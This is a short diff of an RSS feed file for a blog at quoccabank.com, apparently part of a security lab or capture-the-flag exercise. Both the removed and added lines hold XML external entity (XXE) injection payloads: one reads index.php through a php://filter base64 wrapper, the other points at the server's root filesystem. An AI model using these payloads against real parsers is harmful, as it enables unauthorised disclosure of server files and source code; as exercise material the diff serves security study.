@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><rss version="2.0"
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///" >]><rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
@@ -25,7 +25,7 @@
 		<pubDate>Mon, 08 Jun 2020 12:31:03 +0000</pubDate>
 		<guid isPermaLink="false">https://blog.quoccabank.com/?p=42</guid>
 
-					<description>let's n see</description>
+					<description>let's see</description>
 										<content:encoded><![CDATA[
 <p>Scott&#8217;s favourite animal are the sharks.</p>
 ]]></content:encoded>
